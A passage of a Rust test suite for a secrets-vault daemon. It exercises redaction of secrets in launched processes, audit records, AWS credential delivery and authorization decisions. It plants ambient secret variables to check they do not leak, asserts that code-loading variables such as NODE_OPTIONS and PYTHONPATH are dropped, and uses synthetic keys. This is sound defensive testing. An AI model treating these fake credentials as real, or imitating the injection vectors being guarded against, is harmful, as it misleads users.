                                        let records = crate::audit::read(&hook_p, usize::MAX).unwrap();
                                        let intent=crate::audit::current_intent().unwrap();
                                        assert!(records.iter().any(|r| r["id"]==intent && r["action"]=="launch-redaction" && r["phase"]=="intent"));
                                        let id=hook_st.lock().unwrap().launch_redactions.keys().next().unwrap().clone();
                                        if mode=="ok" {
                                            let status=std::process::Command::new(std::env::current_exe().unwrap())
                                                .args(["--exact","daemon::launch_prepare_tests::redaction_sibling_child"])
                                                .env("KARAMBIT_TEST_REDACTION_SOCKET",sock_path(&hook_p)).env("KARAMBIT_TEST_REDACTION_ID",&id)
                                                .stdout(std::process::Stdio::null()).status().unwrap();
                                            assert!(status.success(),"sibling redaction release");
                                        }
                                        let mut g=hook_st.lock().unwrap();
                                        let owner=g.launch_redactions[&id].owner;
                                        match mode {
                                            "cancel" => { g.pending_launches.cancel(&id,owner,now()).unwrap(); },
                                            "revoke" => { g.pending_launches.burn_matching(&["*".into()]); },
                                            "expiry" => { g.launch_redactions.get_mut(&id).unwrap().expires_at=now(); },
                                            // Death in the audit-to-take window: registry still live,
                                            // only the fresh kernel recheck can refuse.
                                            "shim-death" => { let shim=g.launch_redactions[&id].shim.pid; drop(g);
                                                std::fs::write(run_dir(&hook_p).join("hold-bound-drop"),b"").unwrap();
                                                unsafe { libc::kill(shim, libc::SIGKILL); }
                                                // Unreaped zombie: kernel identity reads fail once it is dead.
                                                let until=Instant::now()+WAIT;
                                                while agent::process_identity(shim).is_ok() { assert!(Instant::now()<until); std::thread::sleep(Duration::from_millis(5)); }
                                                g=hook_st.lock().unwrap(); },
                                            _ => (),
                                        }
                                        if mode != "shim-death" { g.reconcile_launch_endpoints(); }
                                    }
                                    Ok(())
                                })));
                                serve_connection(p,st,c,unsafe {libc::getuid()},0);
                            }));
                        },
                        Err(e) if e.kind()==std::io::ErrorKind::WouldBlock => std::thread::sleep(Duration::from_millis(5)),
                        Err(e) => panic!("{e}"),
                    }
                }
                for h in handlers { h.join().unwrap(); }
            });
            let mut owner=std::process::Command::new(std::env::current_exe().unwrap());
            owner.env_clear().env("PATH", &f.p.root).env("FOO", "bar").env("LANG", "C").env("VALUE", "ambient").env("VAULT_TOKEN", "ambient")
                .env("AWS_SECRET_ACCESS_KEY", "ambient").env("OP_SESSION_abc", "ambient").env("ALL_PROXY", "ambient")
                .env("AWS_REGION", "ambient-region").env("AWS_DEFAULT_REGION", "ambient-region")
                .env("AWS_PROFILE", "ambient").env("AWS_DEFAULT_PROFILE", "ambient").env("AWS_ROLE_ARN", "ambient")
                .env("AWS_CONTAINER_CREDENTIALS_FULL_URI", "ambient-uri").env("KARAMBIT_SHIM_CONTROL", "must-not-leak")
                .env("PYTHONPATH", "ambient").env("NODE_OPTIONS", "ambient").env("RUBYOPT", "ambient");
            owner.args(["--exact","daemon::launch_prepare_tests::bound_owner_child","--nocapture"])
                .env("KARAMBIT_TEST_OWNER_ROOT",&f.p.root).env("KARAMBIT_TEST_OWNER_MODE",mode)
                .stdout(std::process::Stdio::piped()).stderr(std::process::Stdio::piped()).process_group(0);
            let mut child=owner.spawn().unwrap();
            if mode == "signals" {
                let until=Instant::now()+WAIT;
                let text=loop { if let Ok(t)=std::fs::read_to_string(f.p.root.join("ready")) && t.split_whitespace().count()==3 { break t; }
                    assert!(child.try_wait().unwrap().is_none(),"owner exited before the target was ready");
                    assert!(Instant::now()<until,"target not ready"); std::thread::sleep(Duration::from_millis(5)); };
                let ids=text.split_whitespace().map(|n| n.parse::<i32>().unwrap()).collect::<Vec<_>>();
                assert_eq!(ids[2],child.id() as i32);
                assert_eq!(unsafe {libc::getpgid(ids[1])},ids[1]);
                assert_eq!(unsafe {libc::kill(-ids[2],libc::SIGINT)},0);
                std::thread::sleep(Duration::from_millis(100));
                assert_eq!(unsafe {libc::kill(ids[1],libc::SIGINT)},0);
                std::thread::sleep(Duration::from_millis(100));
                assert_eq!(unsafe {libc::kill(ids[1],libc::SIGTERM)},0);
                std::thread::sleep(Duration::from_millis(100));
                std::fs::write(f.p.root.join("release"),b"").unwrap();
            }
            let output=child.wait_with_output().unwrap();
            let _ = std::fs::remove_file(run_dir(&f.p).join("hold-bound-drop"));
            done.store(true,std::sync::atomic::Ordering::SeqCst); server.join().unwrap();
            assert!(output.status.success(),"owner mode {mode}: {}",String::from_utf8_lossy(&output.stderr));
            if mode == "ok" {
                let private=test_value();
                let named=vec![("test/ref".into(),private.as_slice()),("aws/static:secret-access-key".into(),creds.secret_access_key.as_bytes())];
                let red=crate::redact::Redactor::new(&named);
                let mut raw=private.to_vec(); raw.push(b'\n'); raw.extend_from_slice(creds.secret_access_key.as_bytes()); raw.push(b'\n');
                let expected=red.process(&mut raw,true);
                for bytes in [&output.stdout,&output.stderr] {
                    assert!(bytes.windows(expected.len()).any(|w|w==expected));
                    assert!(String::from_utf8_lossy(bytes).contains("[REDACTED:AWS_CONTAINER_AUTHORIZATION_TOKEN]\npublic-output-intact\n"));
                    assert!(!bytes.windows(private.len()).any(|w|w==private.as_slice()));
                }
            } else if mode == "unredacted" {
                assert!(f.p.root.join("proof").exists());
                for bytes in [&output.stdout,&output.stderr] {
                    assert!(bytes.windows(test_value().len()).any(|w|w==test_value().as_slice()));
                    assert!(bytes.windows(creds.secret_access_key.len()).any(|w|w==creds.secret_access_key.as_bytes()));
                }
            } else if mode == "signals" { assert!(String::from_utf8_lossy(&output.stdout).contains("counts:2:1")); }
            else { assert!(!f.p.root.join("ready").exists(),"target exec before valid GO: {mode}"); }
            let records=if f.p.audit().exists() { f.records() } else { vec![] };
            if matches!(mode, "ok" | "ambient-env") {
                assert_eq!(String::from_utf8_lossy(&output.stderr).matches("karambit: -e VALUE given more than once; using the last").count(), 1);
                let prepare = records.iter().find(|r| r["action"] == "launch-prepare" && r["phase"] == "intent").unwrap();
                let expected = if mode == "ok" { json!(["aws/static", "test/public", "test/ref"]) } else { json!(["test/public", "test/ref"]) };
                assert_eq!(prepare["secrets"], expected);
                assert!(!serde_json::to_string(&records).unwrap().contains("test/overwritten"));
                if mode == "ambient-env" {
                    assert_eq!(prepare["detail"]["argv"][0], "native-redaction");
                    // Agent owner: code-loading names are audited (names only); allow_env's RUBYOPT is not.
                    let dropped = records.iter().find(|r| r["action"] == "launch-env-dropped").expect("dropped names audited");
                    assert_eq!(dropped["detail"]["names"], json!(["NODE_OPTIONS", "PYTHONPATH"]));
                    assert!(String::from_utf8_lossy(&output.stderr).contains("dropped code-loading variables from the agent's environment: "));
                    assert_eq!(prepare["detail"]["target"]["path"], std::fs::canonicalize(&target).unwrap().to_str().unwrap());
                }
            }
            if mode=="audit-script" {
                let script=std::fs::canonicalize(f.p.root.join("script.sh")).unwrap();
                let hash=crate::platform::helper::sha256_file(&script).unwrap();
                for action in ["launch-prepare","launch-bind","launch-redeem"] {
                    let record=records.iter().find(|r|r["action"]==action && r["phase"]=="intent").unwrap();
                    assert_eq!(record["detail"]["script"]["path"],script.to_str().unwrap());
                    assert_eq!(record["detail"]["script"]["sha256"],hash);
                    assert_eq!(record["detail"]["argv"],json!([target,f.p.root.join("script-link")]));
                    assert!(record["detail"]["owner"]["pid"].is_number());
                    if action=="launch-prepare" { assert!(record["detail"]["shim"].is_null()); }
                    else { assert_ne!(record["detail"]["owner"],record["detail"]["shim"]); }
                }
            }
            if mode.starts_with("unredacted") { assert!(!records.iter().any(|r|r["action"]=="launch-redaction")); }
            // Stale incarnation is refused before audit: no redaction record at all.
            if mode=="stale-version" { assert!(!records.iter().any(|r|r["action"]=="launch-redaction"), "stale socket reached audit"); }
            // Shim death in the audit-to-take window: intent exists, effect must fail.
            if mode=="shim-death" {
                assert!(records.iter().any(|r|r["action"]=="launch-redaction" && r["phase"]=="intent"));
                assert!(records.iter().any(|r|r["action"]=="launch-redaction" && r["phase"]=="outcome" && r["ok"]==false));
                assert!(!records.iter().any(|r|r["action"]=="launch-redaction" && r["phase"]=="outcome" && r["ok"]==true), "redaction released after shim death");
            }
            if mode=="agent-unredacted" || mode=="unredacted-deny" { assert!(!records.iter().any(|r|r["action"]=="launch-prepare")); }
            if mode=="ok" {
                let bind=records.iter().find(|r|r["action"]=="launch-bind" && r["phase"]=="intent").unwrap();
                assert_ne!(bind["detail"]["owner"],bind["detail"]["shim"]);
                assert!(bind["detail"]["target"]["sha256"].as_str().is_some_and(|h|h.len()==64));
                let audit=std::fs::read(f.p.audit()).unwrap();
                for secret in [test_value().to_vec(),creds.secret_access_key.as_bytes().to_vec()] { assert!(!audit.windows(secret.len()).any(|w|w==secret)); }
            }
            assert!(f.st.lock().unwrap().launch_redactions.is_empty());
        }
    }

    // Generated synthetic plaintext never appears in logs, reports or scratch files.
    fn test_value() -> Zeroizing<Vec<u8>> { Zeroizing::new((65..91).cycle().take(64).collect()) }

    // Re-exec is only a shim/client, never a daemon. The handler stays in this
    // test process and uses an empty temp vault with a test-binary hash pin.
    #[test]
    fn launch_bind_child() {
        let Ok(socket) = std::env::var("KARAMBIT_TEST_BIND_SOCKET") else { return };
        let ready = std::env::var("KARAMBIT_TEST_BIND_READY").unwrap();
        let mut c = UnixStream::connect(socket).unwrap();
        let req = std::env::var("KARAMBIT_TEST_BIND_REQUEST").unwrap();
        writeln!(c, "{req}").unwrap();
        let mut reader = BufReader::new(c.try_clone().unwrap());
        let mut line = String::new();
        reader.read_line(&mut line).unwrap();
        let response: Value = serde_json::from_str(&line).unwrap();
        if let Some(token) = response["token"].as_str() {
            assert_eq!(B64.decode(token).unwrap().len(), 32);
            std::fs::write(&ready, "bound").unwrap();
        } else if response["id"].is_string() {
            assert!(response.get("token").is_none());
            std::fs::write(&ready, response["id"].as_str().unwrap()).unwrap();
        } else {
            assert_eq!(response, json!({"error":"launch refused"}));
            std::fs::write(&ready, "refused").unwrap();
        }
        use zeroize::Zeroize;
        line.zeroize();
        let mut action = [0u8];
        if std::io::stdin().read_exact(&mut action).is_ok() {
            match action[0] {
                b'r' | b'n' | b'w' | b'p' | b'v' | b'a' | b'e' => {
                    let token = response["token"].as_str().unwrap();
                    let request = if action[0] == b'e' {
                        // Same token, first character JSON-escaped (\u00XX).
                        let (head, rest) = token.split_at(1);
                        Zeroizing::new(format!("{{\"op\":\"launch_redeem\",\"token\":\"\\u{:04x}{rest}\"}}\n", head.as_bytes()[0]))
                    } else {
                        Zeroizing::new(format!("{{\"op\":\"launch_redeem\",\"token\":\"{token}\"}}\n"))
                    };
                    if action[0] == b'v' {
                        let mut fresh = UnixStream::connect(std::env::var("KARAMBIT_TEST_BIND_SOCKET").unwrap()).unwrap();
                        fresh.write_all(request.as_bytes()).unwrap();
                        let mut line = String::new();
                        BufReader::new(fresh).read_line(&mut line).unwrap();
                        assert_eq!(serde_json::from_str::<Value>(&line).unwrap(), json!({"error":"launch refused"}));
                    }
                    if action[0] == b'w' {
                        writeln!(c, "{{\"op\":\"launch_redeem\",\"token\":\"{}\"}}", B64.encode([0;32])).unwrap();
                    }
                    let _ = c.write_all(request.as_bytes());
                    if action[0] == b'p' { let _ = c.write_all(request.as_bytes()); }
                    let mut line = Zeroizing::new(String::new());
                    reader.read_line(&mut line).unwrap();
                    if matches!(action[0], b'r' | b'p' | b'v') || (action[0] == b'a' && !line.starts_with("{\"error\"")) {
                        #[derive(Deserialize)]
                        struct Received<'a> {
                            target: CommandBinding, argv: Vec<String>, cwd: PathBuf,
                            #[serde(borrow)] env: std::collections::BTreeMap<&'a str, &'a str>,
                        }
                        let bundle: Received<'_> = serde_json::from_str(&line).unwrap();
                        assert!(matches!(bundle.target, CommandBinding::Pinned { .. }));
                        assert_eq!(bundle.argv.len(), 1); assert!(bundle.cwd.is_absolute());
                        assert_eq!(bundle.env.len(), 2);
                        for value in bundle.env.values() {
                            assert_eq!(crate::sso::sha256_hex(value.as_bytes()), crate::sso::sha256_hex(&test_value()));
                        }
                        std::fs::write(Path::new(&ready).with_extension("result"), "released").unwrap();
                    } else {
                        assert_eq!(serde_json::from_str::<Value>(&line).unwrap(), json!({"error":"launch refused"}));
                        std::fs::write(Path::new(&ready).with_extension("result"), "refused").unwrap();
                    }
                    let _ = c.shutdown(std::net::Shutdown::Write);
                    assert_eq!(reader.read(&mut action).unwrap(), 0);
                    return;
                }
                b's' | b'S' | b'M' => {
                    writeln!(c, "{}", json!({"op":"launch_redeem","token":response["token"]})).unwrap();
                    let mut line = Zeroizing::new(String::new());
                    reader.read_line(&mut line).unwrap();
                    let bundle: Value = serde_json::from_str(&line).unwrap();
                    assert_eq!(bundle["env"], json!({}));
                    let creds = if action[0] == b'S' {
                        assert_eq!(bundle["aws"]["account"], "000000000000");
                        assert_eq!(bundle["aws"]["role"], "synthetic");
                        crate::aws::AwsCreds { access_key_id: "ASIAFAKEFAKEFAKE".into(), secret_access_key: "fake".into(), session_token: Some("fake".into()), region: Some("us-east-1".into()), session_mint: false }
                    } else if action[0] == b'M' {
                        // Minted session (aws::mint_test_double), never the long-term key.
                        crate::aws::AwsCreds { access_key_id: "ASIAMINTEDSESSION".into(), secret_access_key: "minted-secret-canary".into(), session_token: Some("minted-token-canary".into()), region: Some("us-east-1".into()), session_mint: false }
                    } else { static_test_creds() };
                    for (_, part) in creds.secret_parts() { assert!(!line.contains(std::str::from_utf8(part).unwrap())); }
                    assert_eq!(bundle["aws"]["region"], "us-east-1");
                    assert!(bundle["aws"]["endpoint_id"].is_string());
                    let url = bundle["aws"]["url"].as_str().unwrap().strip_prefix("http://").unwrap();
                    let (address, path) = url.split_once('/').unwrap();
                    for authorized in [false, true] {
                        let mut http = TcpStream::connect(address).unwrap();
                        let auth = if authorized { format!("Authorization: {}\r\n", bundle["aws"]["token"].as_str().unwrap()) } else { String::new() };
                        write!(http, "GET /{path} HTTP/1.1\r\nHost: localhost\r\n{auth}\r\n").unwrap();
                        let mut result = Zeroizing::new(String::new());
                        http.read_to_string(&mut result).unwrap();
                        if authorized {
                            assert!(result.starts_with("HTTP/1.1 200"));
                            let body: Value = serde_json::from_str(result.split_once("\r\n\r\n").unwrap().1).unwrap();
                            assert_eq!(body["AccessKeyId"].as_str().unwrap(), creds.access_key_id);
                            assert_eq!(body["SecretAccessKey"].as_str().unwrap(), creds.secret_access_key);
                            assert_eq!(body["Token"].as_str(), creds.session_token.as_deref());
                        } else { assert!(result.starts_with("HTTP/1.1 401")); }
                    }
                    std::fs::write(Path::new(&ready).with_extension("result"), "aws-delivered").unwrap();
                    std::io::stdin().read_exact(&mut action).unwrap();
                    c.set_read_timeout(Some(Duration::from_secs(3))).unwrap();
                    if action[0] == b'x' { c.write_all(b"x").unwrap(); }
                    if action[0] != b'e' { assert_eq!(reader.read(&mut action).unwrap(), 0); }
                    return;
                }
                b'f' => { let _ = c.write_all(b"{}\n"); }
                b'o' => { let _ = c.write_all(&vec![b'x'; 128 * 1024]); }
                b't' => {},
                _ => return,
            }
            let mut refusal = String::new();
            reader.read_line(&mut refusal).unwrap();
            assert_eq!(serde_json::from_str::<Value>(&refusal).unwrap(), json!({"error":"launch refused"}));
            assert_eq!(reader.read(&mut action).unwrap(), 0);
        }
    }

    fn install_launch_unwrap(st: Arc<Ctx>, p: Paths, fault: Option<&'static str>) {
        crate::platform::helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |reqs| {
            assert!(st.try_lock().is_ok(), "State held during unwrap");
            assert!(LAUNCH_CAP.with(|cap| cap.borrow().is_some()), "bound helper work needs dispatch authority");
            install_launch_unwrap(st.clone(), p.clone(), fault);
            let cached = !st.lock().unwrap().human.is_empty();
            if cached && fault == Some("cache-screen") { bail!("synthetic locked screen"); }
            if !cached {
                let events = crate::audit::read(&p, usize::MAX).unwrap();
                assert_eq!(events.last().unwrap()["action"], "launch-redeem");
                assert_eq!(events.last().unwrap()["phase"], "intent");
            }
            let sk = p256::SecretKey::from_slice(&[7; 32]).unwrap();
            reqs.iter().map(|(key, eph)| {
                assert_ne!(*key, store::KeyId::Bio, "fresh Bio remains unreachable");
                let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
            }).collect()
        })));
    }

    struct Shim {
        child: std::process::Child,
        handler: Option<std::thread::JoinHandle<()>>,
        ready: PathBuf,
        opens: Arc<std::sync::atomic::AtomicUsize>,
    }
    impl Shim {
        fn start(f: &Fixture, req: Value, bad_hash: bool) -> Self { Self::start_fault(f, req, bad_hash, None) }
        fn start_fault(f: &Fixture, req: Value, bad_hash: bool, fault: Option<&'static str>) -> Self {
            Self::start_auth(f, req, bad_hash, fault, None)
        }
        fn start_auth(f: &Fixture, req: Value, bad_hash: bool, fault: Option<&'static str>, setup: Option<LaunchAuthSetup>) -> Self {
            Self::start_setups(f, req, bad_hash, fault, setup.into_iter().collect())
        }
        fn start_setups(f: &Fixture, req: Value, bad_hash: bool, fault: Option<&'static str>, setups: std::collections::VecDeque<LaunchAuthSetup>) -> Self {
            use std::process::{Command, Stdio};
            let nonce = rand::random::<u64>();
            let socket = f.p.root.join(format!("s-{nonce}"));
            let ready = f.p.root.join(format!("r-{nonce}"));
            let listener = UnixListener::bind(&socket).unwrap();
            let exe = std::env::current_exe().unwrap();
            let exe = if bad_hash {
                let copy = f.p.root.join(format!("different-{nonce}"));
                std::fs::copy(exe, &copy).unwrap();
                use std::fs::OpenOptions;
                OpenOptions::new().append(true).open(&copy).unwrap().write_all(b"different hash").unwrap();
                copy
            } else { exe };
            let child = Command::new(exe).args(["--exact", "daemon::launch_prepare_tests::launch_bind_child", "--nocapture"])
                .env("KARAMBIT_TEST_BIND_SOCKET", socket).env("KARAMBIT_TEST_BIND_READY", &ready)
                .env("KARAMBIT_TEST_BIND_REQUEST", req.to_string())
                .stdin(Stdio::piped()).stdout(Stdio::null()).stderr(Stdio::null()).spawn().unwrap();
            let (c, _) = listener.accept().unwrap();
            let p = f.p.clone(); let st = f.st.clone();
            let http_port = f.http_port;
            let cancel_peer = f.peer.clone();
            let cancel_id = req["id"].as_str().map(str::to_string);
            let opens = Arc::new(std::sync::atomic::AtomicUsize::new(0));
            let open_count = opens.clone();
            let sso_base = f.sso_base.clone();
            let handler = std::thread::spawn(move || {
                crate::sso::TEST_BASE.with(|b| *b.borrow_mut() = sso_base);
                LAUNCH_AUTH_SETUP.with(|h| *h.borrow_mut() = setups);
                let mint_st = st.clone();
                SSO_TEST_HOOK.with(|h| *h.borrow_mut() = Some(("creds-commit", Box::new(move || {
                    assert!(mint_st.try_lock().is_ok(), "State held across minting");
                    if fault == Some("sso-binding-mint") { mint_st.lock().unwrap().invalidate_registration("aws/static"); }
                }))));
                let second = if fault == Some("fresh") {
                    let p = p.clone(); let st = st.clone();
                    Some(std::thread::spawn(move || {
                        let (fresh, _) = listener.accept().unwrap();
                        serve_connection(p, st, fresh, unsafe { libc::getuid() }, 0);
                    }))
                } else { None };
                let hook_st = st.clone();
                let hook_p = p.clone();
                let anchored = cancel_peer.human_anchor().is_some();
                let cancel_peer = cancel_peer.clone();
                let cancel_id = cancel_id.clone();
                let shim_pid = peer_of(&c, unsafe { libc::getuid() }).unwrap();
                LAUNCH_BIND_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |stage| {
                    // Another session may briefly own State. A bounded retry
                    // distinguishes legitimate contention from this thread
                    // incorrectly holding its own non-reentrant guard.
                    let until = Instant::now() + Duration::from_millis(500);
                    loop {
                        if hook_st.try_lock().is_ok() { break; }
                        assert!(Instant::now() < until, "State held across external Bind work");
                        std::thread::yield_now();
                    }
                    if stage == "redeem-open" {
                        open_count.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                        let events = crate::audit::read(&hook_p, usize::MAX).unwrap();
                        let intent = crate::audit::current_intent().unwrap();
                        assert!(events.iter().any(|e| e["id"] == intent && e["action"] == "launch-redeem" && e["phase"] == "intent"));
                    }
                    if (stage == "redeem-audit" && fault == Some("redeem-intent")) || (stage == "redeem-auth-audit" && fault == Some("redeem-auth-audit")) { crate::audit::fail_phase(Some("intent")); }
                    if stage == "redeem-verify" && fault == Some("redeem-kill") {
                        unsafe { libc::kill(shim_pid, libc::SIGKILL); }
                        while agent::process_identity(shim_pid).is_ok() { std::thread::sleep(Duration::from_millis(1)); }
                    }
                    if stage == "redeem-verify" && fault == Some("redeem-owner-swap") {
                        // The owner process now runs a different program (same pid and start time).
                        PROC_EXE_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|_| Some("/usr/bin/true".into()))));
                    }
                    if stage == "redeem-verify" && fault == Some("redeem-cancel") {
                        let id = cancel_id.clone().unwrap();
                        // Owner Cancel lands mid-verification and reports success...
                        assert!(handle_as(&hook_p, &hook_st, cancel_peer.clone(), Req::LaunchCancel { id }, 0, None, Ok).is_ok());
                    }
                    if stage == "redeem-verify" && fault == Some("redeem-revoke") {
                        let mut g = hook_st.lock().unwrap(); g.leases.clear(); g.lease_revision += 1;
                    }
                    // Revocation that lands after finalize but before the fresh human-cache
                    // commit: release is accepted (consume-then-release), caching is not.
                    if stage == "redeem-open" && fault == Some("revoke-before-cache") {
                        hook_st.lock().unwrap().lease_revision += 1;
                    }
                    if fault == Some(stage) && stage != "redeem-auth-audit" { bail!("synthetic external failure"); }
                    Ok(())
                })));
                if anchored {
                    LAUNCH_OWNER_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |mut peer| {
                        set_test_anchor(&mut peer);
                        if fault == Some("cache-env") { peer.caller.env_unknown = true; }
                        if fault == Some("cache-anchor") { peer.anchor = Some((11, 20)); }
                        peer
                    })));
                }
                crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| panic!("AUTH must use the bounded worker"))));
                install_launch_unwrap(st.clone(), p.clone(), fault);
                if fault == Some("intent") { crate::audit::fail_phase(Some("intent")); }
                serve_connection(p, st, c, unsafe { libc::getuid() }, http_port);
                if let Some(second) = second { second.join().unwrap(); }
                crate::audit::fail_phase(None);
            });
            Self { child, handler: Some(handler), ready, opens }
        }
        fn response(&mut self) -> String {
            let start = Instant::now();
            loop {
                // The child creates then writes the readiness file; an observed
                // empty file is not yet a published response.
                if let Ok(s) = std::fs::read_to_string(&self.ready) && !s.is_empty() { return s; }
                assert!(self.child.try_wait().unwrap().is_none(), "shim exited before response");
                assert!(start.elapsed() < Duration::from_secs(10), "shim response timeout");
                std::thread::sleep(Duration::from_millis(10));
            }
        }
        fn finish(&mut self, action: u8) {
            self.child.stdin.take().unwrap().write_all(&[action]).unwrap();
            assert!(self.child.wait().unwrap().success());
            self.handler.take().unwrap().join().unwrap();
        }
    }
    impl Drop for Shim {
        fn drop(&mut self) {
            let _ = self.child.kill(); let _ = self.child.wait();
            if let Some(h) = self.handler.take() { let _ = h.join(); }
        }
    }
    fn bound(f: &Fixture) -> bool { !f.st.lock().unwrap().pending_launches.bound_shims().is_empty() }

    fn redeem_prepare(f: &Fixture) -> Value {
        let mut req = f.req();
        if let Req::LaunchPrepare { env, .. } = &mut req { env.insert("ALIAS".into(), "test/ref".into()); }
        let response = f.send(req).unwrap();
        assert_eq!(response.as_object().unwrap().len(), 2);
        assert!(response.get("token").is_none() && response.get("env").is_none());
        response
    }
    fn redeem_shim(f: &Fixture, prepared: &Value, fault: Option<&'static str>) -> Shim {
        let mut shim = Shim::start_fault(f, json!({"op":"launch_bind","id":prepared["id"]}), false, fault);
        assert_eq!(shim.response(), "bound");
        shim
    }
    fn opens(shim: &Shim) -> usize { shim.opens.load(std::sync::atomic::Ordering::SeqCst) }

    #[test]
    fn launch_shell_authorization_parity_table() {
        use crate::RunAuthorization::*;
        for (agent, tier, allowed, public, scoped, cached, expected) in [
            (true, store::Tier::Bio, false, false, true, false, None),
            (true, store::Tier::Bio, false, false, false, false, Some(Lease)),
            (true, store::Tier::Open, false, true, true, false, Some(OpenPublic)),
            (true, store::Tier::Open, true, false, true, false, Some(AgentAllowed)),
            (false, store::Tier::Open, false, true, true, false, Some(OpenPublic)),
            (false, store::Tier::Open, false, false, true, false, Some(NeedsFreshAuth)),
            (false, store::Tier::Bio, false, false, true, false, Some(NeedsFreshAuth)),
            (false, store::Tier::Bio, false, false, false, true, Some(HumanCached)),
        ] {
            let mut f = if cached { Fixture::human_cached() } else { Fixture::new() };
            f.policy(tier, allowed, public);
            if !agent { f.peer.caller.agent = None; }
            if !scoped && let Some(lease) = f.st.lock().unwrap().leases.get_mut("test/ref") { lease.scope.cmds.clear(); }
            let mut req = f.req();
            if let Req::LaunchPrepare { argv, target, .. } = &mut req { *target = "/bin/sh".into(); *argv = vec!["/bin/sh".into(), "-c".into(), "exit 23".into()]; }
            let result = f.send(req);
            assert_eq!(result.is_ok(), expected.is_some(), "{expected:?}");
            if let Some(expected) = expected {
                let records = f.records();
                let intent = records.iter().find(|e| e["action"] == "launch-prepare" && e["phase"] == "intent").unwrap();
                assert_eq!(intent["detail"]["decisions"]["test/ref"], serde_json::to_value(expected).unwrap());
            } else {
                assert!(!f.st.lock().unwrap().pending_launches.has_pending());
            }
        }
    }

    #[test]
    fn launch_run_authorization_parity_table() {
        use crate::RunAuthorization::*;
        // Decision, not prompt outcome: approved and denied fresh auth both start
        // NeedsFreshAuth. Agent fresh proof is refused by bound Prepare.
        for (agent, tier, allowed, public, leased, cached, expected) in [
            (true, store::Tier::Bio, false, false, true, false, Lease),
            (true, store::Tier::Open, false, true, true, false, OpenPublic),
            (true, store::Tier::Open, true, false, false, false, AgentAllowed),
            (false, store::Tier::Open, true, false, false, false, AgentAllowed),
            (false, store::Tier::Bio, false, false, false, true, HumanCached),
            // An explicit Any lease must never authorize the human path.
            (false, store::Tier::Bio, false, false, true, false, NeedsFreshAuth),
            (false, store::Tier::Bio, false, false, false, false, NeedsFreshAuth),
            (false, store::Tier::Bio, true, false, false, false, NeedsFreshAuth),
            (false, store::Tier::Bio, false, true, false, false, NeedsFreshAuth),
            (false, store::Tier::Open, false, false, true, false, NeedsFreshAuth),
            (false, store::Tier::Open, false, false, false, false, NeedsFreshAuth),
            (true, store::Tier::Bio, true, false, false, false, NeedsFreshAuth),
            (true, store::Tier::Bio, false, true, false, false, NeedsFreshAuth),
            (true, store::Tier::Open, false, false, false, false, Deny),
        ] {
            let mut f = if cached { Fixture::human_cached() } else { Fixture::new() }; f.policy(tier, allowed, public);
            if !agent { f.peer.caller.agent = None; }
            if !leased { f.st.lock().unwrap().leases.clear(); }
            let file = store::load_secret(&f.p, "test/ref").unwrap();
            assert_eq!(crate::run_authorization(&f.peer.caller, &file, leased, cached), expected);
            let result = f.send(f.req());
            assert_eq!(result.is_ok(), matches!(expected, Lease | OpenPublic | AgentAllowed | HumanCached) || (expected == NeedsFreshAuth && !agent), "{expected:?}");
            if result.is_ok() {
                let records = f.records();
                let intent = records.iter().find(|e| e["action"] == "launch-prepare" && e["phase"] == "intent").unwrap();
                assert_eq!(intent["detail"]["decisions"]["test/ref"], serde_json::to_value(expected).unwrap());
            }
        }
    }

    #[test]
    fn bound_use_prompt_matches_legacy_run_context_through_auth() {
        for (argv, expected) in [
            (vec!["/bin/sh".into(), "-c".into(), "J=1\ncurl x".into()], "sh script, 2 lines, sha256 aa858849: J=… curl x"),
            (vec!["/usr/bin/true".into(), "plain".into()], "/usr/bin/true plain"),
        ] {
            let f = Fixture::human_cached();
            f.st.lock().unwrap().human.clear();
            crate::platform::helper::ECDH_HOOK.with(|h| h.borrow_mut().take());
            f.policy(store::Tier::Open, false, false);
            for key in ["bio.key", "open.key"] { std::fs::write(f.p.keys().join(key), b"synthetic init marker").unwrap(); }
            let context = crate::env::run_context(&argv);
            assert_eq!(context, expected);
            let wire = Arc::new(Mutex::new(None));
            let captured = wire.clone();
            crate::platform::helper::CALL_AT_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_, args| {
                assert_eq!(args[0], "auth");
                *captured.lock().unwrap() = Some(args[2].to_owned());
                bail!("synthetic prompt capture")
            })));
            let v = peer_vault(&f.p, &f.peer).unwrap();
            assert!(launch_scope(|| v.unlock_internal("run", &["test/ref".into()], Some(&context), false,
                |_| bail!("unexpected legacy dispatch"))).is_err());
            crate::platform::helper::CALL_AT_HOOK.with(|h| h.borrow_mut().take());
            let legacy = wire.lock().unwrap().take().expect("legacy AUTH prompt");
            let parsed: Value = serde_json::from_str(&legacy).unwrap();
            assert_eq!(parsed["params"][2], expected);
            let legacy_audit = f.records();
            assert!(legacy_audit.iter().any(|r| r["action"] == "run" && r["detail"]["context"] == context));
            let mut req = f.req();
            if let Req::LaunchPrepare { argv: a, target, .. } = &mut req { *target = argv[0].clone().into(); *a = argv; }
            let prepared = f.send(req).unwrap();
            let called = Arc::new(std::sync::atomic::AtomicBool::new(false));
            let observed = called.clone();
            let setup: LaunchAuthSetup = Box::new(move |reason| {
                let reason = reason.clone();
                crate::platform::helper::CALL_AT_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_, args| {
                    assert_eq!(args[0], "auth");
                    assert_eq!(args[2], legacy, "typed prompt wire must be byte-identical");
                    observed.store(true, std::sync::atomic::Ordering::SeqCst);
                    bail!("synthetic prompt capture")
                })));
                // Consume the AUTH hook, then serialize the actual reason through
                // the guarded test-only helper transport (never a real helper).
                crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || crate::platform::helper::auth(&reason))));
            });
            let mut shim = Shim::start_auth(&f, json!({"op":"launch_bind","id":prepared["id"]}), false, None, Some(setup));
            assert_eq!(shim.response(), "bound");
            shim.child.stdin.take().unwrap().write_all(b"n").unwrap();
            assert!(shim.child.wait().unwrap().success());
            shim.handler.take().unwrap().join().unwrap();
            assert!(called.load(std::sync::atomic::Ordering::SeqCst));
